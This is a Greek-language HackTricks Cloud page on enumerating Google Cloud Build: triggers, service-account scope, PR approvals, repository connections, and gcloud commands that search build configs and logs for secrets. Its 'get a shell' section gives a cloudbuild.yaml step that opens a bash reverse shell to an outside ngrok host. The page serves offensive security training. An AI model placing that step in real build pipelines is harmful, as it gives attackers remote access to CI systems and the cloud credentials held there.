# GCP - Cloud Build Enum

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Το Google Cloud Build είναι μια διαχειριζόμενη πλατφόρμα CI/CD που **αυτοματοποιεί τις διαδικασίες κατασκευής και κυκλοφορίας λογισμικού**, ενσωματώνοντας με **αποθετήρια πηγαίου κώδικα** και υποστηρίζοντας ένα ευρύ φάσμα γλωσσών προγραμματισμού. **Επιτρέπει στους προγραμματιστές να κατασκευάζουν, να δοκιμάζουν και να αναπτύσσουν κώδικα αυτόματα** ενώ παρέχει ευελιξία για την προσαρμογή των βημάτων και των ροών εργασίας της κατασκευής.

Κάθε Cloud Build Trigger είναι **σχετικό με ένα Cloud Repository ή συνδεδεμένο άμεσα με ένα εξωτερικό αποθετήριο** (Github, Bitbucket και Gitlab).

{% hint style="success" %}
Δεν μπόρεσα να βρω τρόπο να κλέψω το Github/Bitbucket token από εδώ ή από τα Cloud Repositories γιατί όταν το αποθετήριο κατεβαίνει, προσπελάζεται μέσω ενός [https://source.cloud.google.com/](https://source.cloud.google.com/) URL και το Github δεν προσπελάζεται από τον πελάτη.
{% endhint %}

### Συμβάντα

Το Cloud Build μπορεί να ενεργοποιηθεί αν:

* **Push σε ένα branch**: Καθορίστε το branch
* **Push ενός νέου tag**: Καθορίστε το tag
* **Pull request**: Καθορίστε το branch που λαμβάνει το PR
* **Χειροκίνητη Ενεργοποίηση**
* **Μήνυμα Pub/Sub:** Καθορίστε το θέμα
* **Συμβάν webhook**: Θα εκθέσει ένα HTTPS URL και το αίτημα πρέπει να είναι αυθεντικοποιημένο με ένα μυστικό

### Εκτέλεση

Υπάρχουν 3 επιλογές:

* Ένα yaml/json **που καθορίζει τις εντολές** για εκτέλεση. Συνήθως: `/cloudbuild.yaml`
* Μόνο ένα που μπορεί να καθοριστεί "inline" στην web κονσόλα και στο cli
* Η πιο κοινή επιλογή
* Σχετικό για μη αυθεντικοποιημένη πρόσβαση
* Ένα **Dockerfile** για κατασκευή
* Ένα **Buildpack** για κατασκευή

### Δικαιώματα SA

Ο **Λογαριασμός Υπηρεσίας έχει το `cloud-platform` scope**, οπότε μπορεί να **χρησιμοποιήσει όλα τα προνόμια.** Αν **δεν καθοριστεί SA** (όπως όταν γίνεται submit) θα χρησιμοποιηθεί ο **προεπιλεγμένος SA** `<proj-number>@cloudbuild.gserviceaccount.com`.

Από προεπιλογή δεν δίνονται δικαιώματα αλλά είναι αρκετά εύκολο να του δοθούν κάποια:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Εγκρίσεις

Είναι δυνατό να ρυθμίσετε ένα Cloud Build να **απαιτεί εγκρίσεις για εκτελέσεις κατασκευής** (απενεργοποιημένο από προεπιλογή).

### Εγκρίσεις PR

Όταν το trigger είναι PR επειδή **οποιοσδήποτε μπορεί να κάνει PRs σε δημόσια αποθετήρια** θα ήταν πολύ επικίνδυνο να **επιτρέπεται η εκτέλεση του trigger με οποιοδήποτε PR**. Επομένως, από προεπιλογή, η εκτέλεση θα είναι **αυτόματη μόνο για ιδιοκτήτες και συνεργάτες**, και για να εκτελεστεί το trigger με PRs άλλων χρηστών, ένας ιδιοκτήτης ή συνεργάτης πρέπει να σχολιάσει `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### Συνδέσεις & Αποθετήρια

Οι συνδέσεις μπορούν να δημιουργηθούν πάνω σε:

* **GitHub:** Θα εμφανίσει ένα OAuth prompt ζητώντας δικαιώματα για **λήψη ενός Github token** που θα αποθηκευτεί μέσα στο **Secret Manager.**
* **GitHub Enterprise:** Θα ζητήσει να εγκαταστήσετε ένα **GithubApp**. Ένα **authentication token** από τον κεντρικό υπολογιστή του GitHub Enterprise θα δημιουργηθεί και θα αποθηκευτεί σε αυτό το έργο ως μυστικό του **Secret Manager**.
* **GitLab / Enterprise:** Πρέπει να **παρέχετε το API access token και το Read API access token** που θα αποθηκευτούν στο **Secret Manager.**

Μόλις δημιουργηθεί μια σύνδεση, μπορείτε να τη χρησιμοποιήσετε για να **συνδέσετε αποθετήρια στα οποία έχει πρόσβαση ο λογαριασμός Github**.

Αυτή η επιλογή είναι διαθέσιμη μέσω του κουμπιού:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Σημειώστε ότι τα αποθετήρια που συνδέονται με αυτή τη μέθοδο είναι **διαθέσιμα μόνο σε Triggers που χρησιμοποιούν 2η γενιά.**
{% endhint %}

### Σύνδεση Αποθετηρίου

Αυτό δεν είναι το ίδιο με μια **`σύνδεση`**. Αυτό επιτρέπει **διαφορετικούς** τρόπους για να αποκτήσετε **πρόσβαση σε ένα αποθετήριο Github ή Bitbucket** αλλά **δεν δημιουργεί ένα αντικείμενο σύνδεσης, αλλά δημιουργεί ένα αντικείμενο αποθετηρίου (1ης γενιάς).**

Αυτή η επιλογή είναι διαθέσιμη μέσω του κουμπιού:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Αποθήκευση

Μερικές φορές το Cloud Build θα **δημιουργήσει μια νέα αποθήκευση για να αποθηκεύσει τα αρχεία για το trigger**. Αυτό συμβαίνει για παράδειγμα στο παράδειγμα που προσφέρει το GCP με:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Ένας Storage bucket με όνομα [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) δημιουργείται για να αποθηκεύσει ένα `.tgz` με τα αρχεία που θα χρησιμοποιηθούν.

### Απόκτηση κελύφους
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```markdown
Install gcloud inside cloud build:
```

Εγκατάσταση του gcloud μέσα στο cloud build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

Θα μπορούσατε να βρείτε **ευαίσθητες πληροφορίες στις ρυθμίσεις και τα αρχεία καταγραφής των build**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Κλιμάκωση Προνομίων

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Μη Αυθεντικοποιημένη Πρόσβαση

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Μετα-Εκμετάλλευση

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
